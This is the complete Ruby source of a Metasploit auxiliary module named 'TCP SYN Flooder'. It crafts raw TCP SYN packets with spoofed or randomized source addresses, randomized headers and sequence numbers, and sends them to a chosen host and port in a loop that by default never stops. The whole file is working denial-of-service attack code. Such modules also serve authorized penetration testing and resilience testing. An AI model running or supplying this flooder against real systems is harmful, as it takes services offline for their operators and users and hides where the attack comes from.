##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'racket'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Ip
	include Msf::Auxiliary::Dos

	def initialize
		super(
			'Name'        => 'TCP SYN Flooder',
			'Description' => 'A simple TCP SYN flooder',
			'Author'      => 'kris katterjohn',
			'License'     => MSF_LICENSE,
			'Version'     => '$Revision$' # 03/13/2009
		)

		register_options([
			Opt::RPORT(80),
			OptAddress.new('SHOST', [false, 'The spoofable source address (else randomizes)']),
			OptInt.new('NUM', [false, 'Number of SYNs to send (else unlimited)'])
		])
	end

	def rport
		datastore['RPORT'].to_i
	end

	def srchost
		datastore['SHOST'] || [rand(0x100000000)].pack('N').unpack('C*').join('.')
	end

	def run
		return if not connect_ip

		sent = 0
		num = datastore['NUM']

		print_status("SYN flooding #{rhost}:#{rport}...")

		n = Racket::Racket.new
		n.l3 = Racket::L3::IPv4.new
		n.l3.dst_ip = rhost
		n.l3.protocol = 6
		n.l4 = Racket::L4::TCP.new
		n.l4.src_port = rand(65535)+1
		n.l4.dst_port = rport
		n.l4.flag_syn = 1
		n.l4.ack = 0

		while (num <= 0) or (sent < num)

			n.l3.src_ip = srchost		
			n.l3.id = rand(0x10000)
			n.l3.ttl = rand(128)+128		
			n.l4.window   = rand(4096)+1
			n.l4.src_port = rand(65535)+1
			n.l4.seq  = rand(0x100000000)

			n.l4.fix!(n.l3.src_ip, n.l3.dst_ip, '')	

			pkt = n.pack

			ip_write(pkt)

			sent += 1
		end

		disconnect_ip
	end
end

